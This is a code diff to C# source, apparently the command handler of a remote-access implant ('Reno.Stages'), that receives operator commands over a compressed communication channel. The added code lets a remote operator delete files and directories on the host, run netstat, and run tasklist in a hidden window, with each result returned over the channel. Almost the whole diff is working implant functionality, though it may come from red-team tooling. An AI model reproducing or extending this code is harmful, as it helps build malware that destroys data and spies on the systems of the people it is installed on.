@@ -1,6 +1,8 @@
 ﻿using System;
 using System.IO;
 using System.Text;
+using System.Text.RegularExpressions;
+using System.Diagnostics;
 using Reno.Comm;
 
 namespace Reno.Stages
@@ -99,6 +101,7 @@ namespace Reno.Stages
                     case CommChannel.CD:
                         if(header.DataLength == 0)
                         {
+                            Console.WriteLine("No argument");
                             pwd = "C:\\";
                             byte[] bytes = channel.Compress(Encoding.UTF8.GetBytes(pwd));
                             CommHeader cdHeader = CreateHeader(header.Command, header.Compression, CommChannel.RESPONSE, header.Id, bytes.Length);
@@ -120,14 +123,103 @@ namespace Reno.Stages
                         }
                         break;
                     case CommChannel.DELETE:
+                        // Deletes a file or directory provided as an argument
+                        byte[] objectToDelete = channel.ReceiveBytes(header.DataLength);
+                        string fileSystemObject = Encoding.UTF8.GetString(channel.Decompress(objectToDelete));
+                        // Do some checking on the string - if the object is not fully qualified, make it
+                        // I.e delete c:\Users.txt should be used if supplied
+                        // i.e. delete users.txt should expand users.txt to pwd + \users.txt
+                        Regex fullPath = new Regex(@"^\\\\|^\\|^[a-zA-z]:\\");
+                        string returnMessage = "";
+                        if (!fullPath.IsMatch(fileSystemObject))
+                        {
+                            fileSystemObject = Path.Combine(pwd, Path.GetFileName(fileSystemObject));
+                        }
+                        
+                        if (File.Exists(fileSystemObject))
+                        {
+                            // Try to delete the file
+                            try
+                            {
+                                File.Delete(fileSystemObject);
+                                returnMessage = "File deleted";
+                                byte[] bytes = channel.Compress(Encoding.UTF8.GetBytes(returnMessage));
+                                CommHeader deleteHeader = CreateHeader(header.Command, header.Compression, CommChannel.RESPONSE, header.Id, bytes.Length);
+                                channel.SendHeader(deleteHeader);
+                                channel.SendBytes(bytes);
+                            }
+                            catch(ArgumentException e)
+                            {
+                                returnMessage = "Error deleting file " + e.Message;
+                                byte[] bytes = channel.Compress(Encoding.UTF8.GetBytes(returnMessage));
+                                CommHeader deleteHeader = CreateHeader(header.Command, header.Compression, CommChannel.RESPONSE, header.Id, bytes.Length);
+                                channel.SendHeader(deleteHeader);
+                                channel.SendBytes(bytes);
+                            }
+                        }
+                        else if (Directory.Exists(fileSystemObject))
+                        {
+                            try
+                            {
+                                Directory.Delete(fileSystemObject);
+                                returnMessage = "Directory deleted";
+                                byte[] bytes = channel.Compress(Encoding.UTF8.GetBytes(returnMessage));
+                                CommHeader deleteHeader = CreateHeader(header.Command, header.Compression, CommChannel.RESPONSE, header.Id, bytes.Length);
+                                channel.SendHeader(deleteHeader);
+                                channel.SendBytes(bytes);
+                            }
+                            catch(Exception e)
+                            {
+                                returnMessage = "Error deleting directory " + e.Message;
+                                byte[] bytes = channel.Compress(Encoding.UTF8.GetBytes(returnMessage));
+                                CommHeader deleteHeader = CreateHeader(header.Command, header.Compression, CommChannel.RESPONSE, header.Id, bytes.Length);
+                                channel.SendHeader(deleteHeader);
+                                channel.SendBytes(bytes);
+                            }
+                        }
+                        else
+                        {
+                            returnMessage = "No such file system object";
+                            byte[] bytes = Encoding.UTF8.GetBytes(returnMessage);
+                            CommHeader deleteHeader = CreateHeader(header.Command, header.Compression, CommChannel.RESPONSE, header.Id, bytes.Length);
+                            channel.SendHeader(deleteHeader);
+                            channel.SendBytes(bytes);
+                        }
                         break;
                     case CommChannel.UPLOAD:
                         break;
                     case CommChannel.DOWNLOAD:
                         break;
                     case CommChannel.NETSTAT:
+                        Process netstat = new Process();
+                        ProcessStartInfo netstatInfo = new ProcessStartInfo();
+                        netstatInfo.FileName = "netstat.exe";
+                        netstatInfo.Arguments = "-ant";
+                        netstatInfo.UseShellExecute = false;
+                        netstatInfo.RedirectStandardOutput = true;
+                        netstat.StartInfo = netstatInfo;
+                        netstat.Start();
+                        string netstatOutput = netstat.StandardOutput.ReadToEnd();
+                        byte[] netstatBytes = Encoding.UTF8.GetBytes(netstatOutput);
+                        CommHeader netstatHeader = CreateHeader(header.Command, header.Compression, CommChannel.RESPONSE, header.Id, netstatBytes.Length);
+                        channel.SendHeader(netstatHeader);
+                        channel.SendBytes(netstatBytes);
                         break;
                     case CommChannel.PS:
+                        Process ps = new Process();
+                        ProcessStartInfo psInfo = new ProcessStartInfo();
+                        psInfo.FileName = "tasklist.exe";
+                        psInfo.WindowStyle = ProcessWindowStyle.Hidden;
+                        psInfo.UseShellExecute = false;
+                        psInfo.RedirectStandardOutput = true;
+                        ps.StartInfo = psInfo;
+                        ps.Start();
+                        string output = ps.StandardOutput.ReadToEnd();
+                        Console.WriteLine(output);
+                        byte[] psBytes = Encoding.UTF8.GetBytes(output);
+                        CommHeader psHeader = CreateHeader(header.Command, header.Compression, CommChannel.RESPONSE, header.Id, psBytes.Length);
+                        channel.SendHeader(psHeader);
+                        channel.SendBytes(psBytes);
                         break;
                 }
             }
